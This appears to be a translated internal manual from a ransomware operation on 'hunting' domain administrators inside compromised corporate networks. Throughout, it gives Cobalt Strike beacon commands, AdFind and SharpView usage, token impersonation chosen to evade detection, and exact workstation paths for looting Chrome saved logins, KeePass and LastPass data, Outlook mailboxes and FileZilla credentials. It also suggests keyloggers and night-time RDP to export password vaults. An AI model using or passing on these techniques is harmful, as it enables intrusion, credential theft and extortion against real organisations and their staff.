"'Hantim admin.

And so, if we have servers\NAS\tapes or cloud storage where backups are stored,but there is no access, then we need credits that only the administrator has.
Accordingly, we need to shant it. Usually, in those networks where we work, there are 1-2-3 admins, no more.
People are divided into 3 types of positions:

Senior(Senior)
Medium(Medium)
Junior(Junior)

Of course, we are interested in seniors because they have more privileges\accesses(read passwords).


To begin with, I will write several options for how to determine the accounts of those administrators who have passwords on board.

Part1::
Option #1:
We ask YES

```

beacon> shell net group "domain admins" /domain

Tasked beacon to run: net group "domain admins" /domain

```

We look and filter service accounts and non-service ones with our eyes.
The service ones from the list above are for example
```
SAPServiceDA9
services
telnet
servies2
Sapservice01
...

```

Which accounts are MOST LIKELY to suit us:
` ' staseb
Johnadm
```

They were recorded.

We can see who they are in adfind_persons.txt

or through the command
```shell net user staseb /domain
```

See the example:
``

We look at who he is-he is part of a dozen groups, SOMETIMES they write in the Comment column who he is - an engineer\sys admin\support\business consultant.
in Last Login, the account must be ACTIVE - that is, last login today\yesterday\this week, but not a year ago or Never.
If it did not become clear who this is after the survey, see adfind + check linkedin (see the section below).

So 2-3-5 accounts as a result, you pick out the admins from the domain and interview everyone and should have an idea who this is. According to the result of 1-2-3 accounting, it turns out to find who can be the admin.


Option #2:
We turn into home analysts - we look at Adfind.
We are interested in the adfind_groups file
We go in, we see a bunch of text
Press Ctrl + F(Notepad2 / Geany)
And enter
```dn:CN=
```
And the Find All in current document button.

the output is APPROXIMATELY the following(I cut out a piece and left 10-20 lines, usually there are from 100 to 10000 lines)
``

adfind_groups:3752: dn:CN=SQLServer2005SQLBrowserUser$TRUCAMTLDC,CN=Users,DC=domain,DC=com
adfind_groups:3775: dn:CN=clubsocial,CN=Users,DC=domain,DC=com

adfind_groups:4037: dn:CN=Signature USA,OU=Groupes,OU=Infra,DC=domain,DC=com

```

And so, we extracted the active directory groups.
What we are interested in here and why we did it - everything is structured in active directroy and everything is done in USA EU networks in a maximally clear transparent way with comments, notes, prescriptions, etc
We have an interesting group that deals with IT, administration, LAN engineering.
What was given to us after the search-we take it out to a new notebook and do a search for the following key words:
" `
IT
Admin
engineer
-----
```

In the example above, we find the following line
```
adfind_groups:3877: dn:CN=IT,CN=Users,DC=domain,DC=com
```

Go to line 3877 in adfind_Groups.txt and we see the following:
```

dn:CN=IT,CN=Users,DC=domain,DC=com
>objectClass: top
>objectClass: group
>cn: IT
>description: Informatique
>member: CN=MS Surface,OU=IT,DC=domain,DC=com

>member: CN=ftp,CN=Users,DC=domain,DC=com
>member: CN=St-Amand\, Sebastien\, CDT,OU=IT,DC=domain,DC=com
```

We skip ftp and MS Surface users, but we take Gyslain Petit and St Amand Sebastien into circulation.
Next, open ad_users.txt
Enter Gyslain Petit
We find a user with the following information`
" `

Look at the title and who is it here? Director of Information Technologies. A bull's-eye, it would seem, but the director does not always have passwords, but a System Administrator of some kind is quite.
Therefore, we perform similar manipulations for the second user and more. At home (=in the conf), we make notes of who is who and write down logins from adfind (sAMAccountName) like this:
```>sAMAccountName: gpetit
```

"'
gpetit-Director of IT
staseb-so-and-so
```


The second part of option #2(Simplified):
We look initially at adfind_users.txt We
do a search by
```title:
description
departament
```
If you are lucky, then there will be directly written posts. In my test case, it looks like this:

```
adfind_persons:280: >title: Responsable, logistique direct import
adfind_persons:1836: >title: Chef des services techniques
adfind_persons:1955: >title: Chef comptable
adfind_persons:4544: >title: Directeur, technologie de l'information
adfind_persons:6064: >title: Présidente
adfind_persons:6191: >title: Chargée de projets, mise en marché
adfind_persons:6285: >title: Directrice marketing
adfind_persons:6848: >title: Coordonnatrice à la logistique
adfind_persons:6948: >title: Responsable de l'expedition
```

Accordingly, we run through the eyes and the accounts are found.


And so, these are easy methods. Let's consider alternative searches for admin accounts.
I know only 1 simple method so far - linkedin
We drive a query into Google
```
NASHAZHERTVA.COM linkedin
` '
instead of the domain-insert the domain of the office.

Go to Members
We do a search there for
` '
System
Admin
Engineer
Network
It
```
If someone has a first name + last name, then we drive it into the adfind and the account is found.
If you know about more effective methods, please write to @rozetka

And so, part #1 is finished.

We proceed to the admin hunt and inspection

Part #2:
We hunt the admin as standard via SharpView
SharpView.exe you can take part in the conference from your team leaders or from the confa software
The team for Hunt is as follows:
On Linux
```
execute-assembly /home/user/soft/scripts/SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
```
On Windows >
```
execute-assembly C:\Users\Андрей\Soft\Hacking\SharpView.exe Find-DomainUserLocation -UserIdentity gpetit
``

where gpetit is the account of the person we are looking for. what is written in adfinusers in sAMAccountName - we insert it here.

At the output, we get approximately the following log:

```

UserDomain : domain
UserName : gpetit
ComputerName : DC01.domain.LOCAL
IPAddress : 172.16.1.3
SessionFrom : 192.168.100.55
SessionFromName :
LocalAdmin :

UserDomain : domain
UserName : gpetit
ComputerName : SQL01.domain.LOCAL
IPAddress : 172.16.1.30
SessionFrom : 192.168.100.55
SessionFromName :
LocalAdmin :

UserDomain : domain
UserName : gpetit
ComputerName : lptp-gpetit.domain.LOCAL
IPAddress : 172.16.1.40
SessionFrom : 192.168.100.55
SessionFromName :
LocalAdmin :

```


And so, the log will be an approximate format of how we should be with this -
First, how the software works - it polls where the user is at least somehow authorized at this moment. And our user is not simple - he is an administrator and at some point he can be authorized on 20-30-50 servers.
How do we filtranut and not get bogged down in this?
First, we remove the OS that we are not interested in
for example, the first DC01 in the list is clearly the domain controller 01, you can check it by adfind_computers.txt or portscan 172.16.1.13 and see that it is a SERVER OS. And we need a client's one.
The second is SQL01-the winning OS. It doesn't suit us.
We look at the third one - lptp-gpetit. Hmm, our user's name is gpetit, and lptp means laptop, that is, a laptop. Maybe it's just him.
#It also happens that the admin is connected ONLY to server OS, but in the SessionFrom column - IP from another sabnet(for example, vpn sabnet) where he sits quietly but SharpView did not "take it" - you can also take it into circulation.
Next - AN IMPORTANT POINT.
Beginners first of all try to raise a session there and VERY OFTEN catch an alert. Alert from the admin = cutting out of the network, loss of time, nerves. You can'T do that!
What we will do is to poll it through the file system.
We do the following
```shell net view \\172.16.1.40 /ALL
```

At the output we see its local dics
```
C$
D$
```
We put on a token(a token is recommended, because pth leaves a slightly different Event ID on the domain controller, and the admin may notice this and cut us out)

Open the File Manager in cobalt:
``\\172.16.1.40\c$
```

or we use the shell via
```
shell dir \\172.16.1.40\c$```

We look at what is on disk C fluently
Go to the folder
```\\172.16.1.40\c$\Users\gpetit
```

Usually, if this is REALLY an admin's work station , he has a lot of junk ala Virtualbox / putty / winscp, etc

How do we "inspect" it, here is a list of interesting directories:

Desktop
```\\172.16.1.40\c$\Users\gpetit\Desktop
```
```
\\172.16.1.40\c$\Users\gpetit\OneDrive
\\172.16.1.40\c$\Users\gpetit\Downloads
\\172.16.1.40\c$\Users\gpetit\Desktop
\\172.16.1.40\c$\Users\gpetit\Documents

```
Here are folders with user configurations, below is a list of what can be extracted:
```\\172.16.1.40\c$\Users\gpetit\AppData\Local
```

```\\172.16.1.40\c$\Users\gpetit\AppData\Roaming
```

```
\\172.16.1.40\c$\Users\gpetit\AppData\Local\Google\Chrome\User Data\Default
```
Here are the History && Login Data from chrome.
History can be directly downloaded and viewed using DBrowser for SQLite (nix win). What is useful - to see where the admin goes, for whom he votes, you can sort the history by the title and find a straight NAS / Tape / vSphere, etc. A VERY useful thing.
Login Data-logins and passwords are stored. Encrypted (!). If it weighs 38-42kb, then it is EMPTY. If it weighs more than 40-45kb( from 100kb to 1-2megabytes), then there are DEFINITELY passwords there. If you have the necessary URL with a saved password, contact your team leader.
It also happens in chrome that there are no passwords in the Login Date, but if you carefully look at the profile folder, you will find the extensions folder and there is lastpass. This can also happen in practice - in this case, go through RDP at night and export passwords(either keylogger or other options)

Similarly, you can view the Firefox / Edge folder (I will add the paths, they are easily googled)

also, sys admins OFTEN have the following folders in AppData\Roaming && AppData\Local:
` ' Keepass
LastPass
``
there are their configs. We drag them, put them in the confu. if this is found , it means that MOST LIKELY there are a lot of exactly the right passwords there.

It also happens that the admin directly on the desktop stores ala
```access.xlsx
passwords.docx
```
Download, break, watch.

there is also an outlook folder
```\\172.16.1.40\c$\Users\gpetit\AppData\Local\Microsoft\Outlook
```
Here is the file ala
```gpetit@domain.com - Exchange1.ost
```
It contains the CORRESPONDENCE of this pepper. You can download it to yourself, open the free ost viewer and view the input\output mail. It is REGULARLY useful to understand difficult situations with this technique.
It is copied simply - we turn off outlook.exe, we make a copy paste .ost file, then the user will open outlook for himself.

```
\\172.16.1.40\c$\Users\gpetit\AppData\Local\Filezilla
\\172.16.1.40\c$\Users\gpetit\AppData\Roaming\Filezilla
```
Here are the files sitemanager.xml they can be with credits from FTP SSH. Download, watch, throw in the confu.


We also inspect \\172.16.1.40\C$\ProgramData
+Program files / x86
+ Local disks that fell out in net view \ \ host /ALL
D$ etc

Also in ad_users.txt sometimes homeDir happens - we also watch it, study it.


Like everything.

Why the manual was written - so that they would not try to rush to raise the session and catch alerts from the admin.
Our job is rather to figure out how it works, and not to configure the brute force in all kinds of accesses.
Everything has already been hacked, you just need to look at everything !through the eyes of the admin!
The main task when hunting an admin is to understand where he stores passwords and steal the database\excel\file\textvoik\document
